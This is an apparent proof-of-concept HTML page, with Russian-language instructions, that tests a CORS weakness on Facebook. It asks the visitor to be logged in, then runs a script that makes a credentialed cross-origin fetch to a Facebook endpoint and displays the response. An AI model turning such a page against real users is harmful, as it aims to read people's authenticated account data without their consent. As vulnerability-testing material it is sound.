<!DOCTYPE html>
<html>
  <body>
    <h1>Facebook CORS PoC</h1>
    <p>Открой эту страницу в браузере, в котором ты залогинен в Facebook</p>
    <script>
      fetch("https://www.facebook.com/tr?id=123456", {
        method: "GET",
        credentials: "include"
      })
      .then(r => r.text())
      .then(t => {
        document.body.innerHTML += "<h2>Ответ от Facebook:</h2><pre>" + t + "</pre>";
      })
      .catch(err => {
        document.body.innerHTML += "<pre>Ошибка запроса: " + err + "</pre>";
      });
    </script>
  </body>
</html>
